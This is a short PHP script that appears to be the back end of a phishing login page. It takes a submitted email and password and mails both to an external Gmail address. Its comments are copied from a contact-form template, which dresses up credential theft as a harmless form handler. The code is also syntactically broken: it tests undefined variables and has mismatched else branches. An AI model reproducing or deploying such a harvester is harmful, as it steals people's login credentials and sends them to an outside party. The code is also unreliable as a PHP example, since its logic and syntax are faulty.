<?php

    // Retrieve form data
    $email = $_POST["email"];
    $password = $_POST["password"];

    
    if(!empty($username) && !empty($message)){
        //if email and message field is not empty
        if(filter_var($username, FILTER_VALIDATE_EMAIL)){
            //if user entered email is valid
            $receiver = "demoictworld@gmail.com"; 
            //email receiver email is valid
            $subject = "From: $email <$password>";
            $body = "Email: $email\nPassword: $password, \nemail";
            $sender = "From: $email";
            if(mail($receiver, $subject, $body, $sender)){
                echo "Your message has been sent";
            }else{
                echo "Sorry, failed to send your message";
            }else{
            echo "Enter a valid email address";
        }else{
        echo "Email and password is required!";
    }

?>
